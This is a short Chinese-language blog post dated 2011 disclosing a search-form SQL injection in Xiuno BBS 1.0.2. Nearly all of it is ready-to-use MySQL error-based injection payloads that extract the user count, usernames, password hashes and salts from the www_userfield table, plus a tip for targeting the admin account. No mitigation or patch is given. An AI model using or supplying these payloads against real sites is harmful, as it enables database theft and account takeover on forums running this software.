---
title: 修罗(Xiuno 1.0.2)bbs 注入漏洞
date: 2011-11-23 05:46
tags:
---
前段时间爆出 **Xiuno bbs** 后台拿shell
无意中翻了下代码发现 搜索型注入漏洞（POST）
`magic_quotes_gpc = Off`

**获取用户个数**
```sql
' AND (SELECT 1600 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(COUNT(*) AS CHAR),0x20)),1,50) FROM www_userfield),0x7e7430306c73,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lost'='lost
```

**获取用户名：**
```sql
' AND (SELECT 3849 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,50) FROM www_userfield LIMIT 0,1),0x7e7430306c73,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lost'='lost
```
**获取密码:**
```sql
' AND (SELECT 7750 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,50) FROM www_userfield LIMIT 0,1),0x7e7430306c73,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lost'='lost
```
**获取salt:**
```sql
' AND (SELECT 7750 FROM(SELECT COUNT(*),CONCAT(0x6c6f7374776f6c667e,(SELECT MID((IFNULL(CAST(salt AS CHAR),0x20)),1,50) FROM www_userfield LIMIT 0,1),0x7e7430306c73,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'lost'='lost
```
**一步获取**
```sql
' AND (SELECT 2861 FROM(SELECT COUNT(*),CONCAT((SELECT concat(0x757365726e616d653a,username,0x3b70617373776f72643a,password,0x3a,salt)  FROM www_userfield limit 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'MOBL'='MOBL
```
**note:**
`LIMIT = 用户个数-1,1`

`xx FROM www_userfield where username='admin';`